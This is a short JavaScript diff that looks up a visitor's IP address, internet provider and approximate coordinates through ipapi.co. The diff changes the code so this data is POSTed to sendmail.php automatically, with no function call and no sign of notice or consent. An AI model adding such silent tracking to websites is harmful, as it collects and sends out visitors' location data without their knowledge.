@@ -15,12 +15,12 @@ fetch('https://ipapi.co/json/')
         info = `IP пользователя: ${userIP}\n Интернет провайдер: ${network}\n широта: ${latitude}\n долгота: ${longitude}`
         
     });
-async function sendLocation(){
-    let response = await fetch('sendmail.php', {
-        method: 'POST',
-        body: info,
-    })
-}
+
+let response = await fetch('sendmail.php', {
+    method: 'POST',
+    body: info,
+})
+
 
    
     
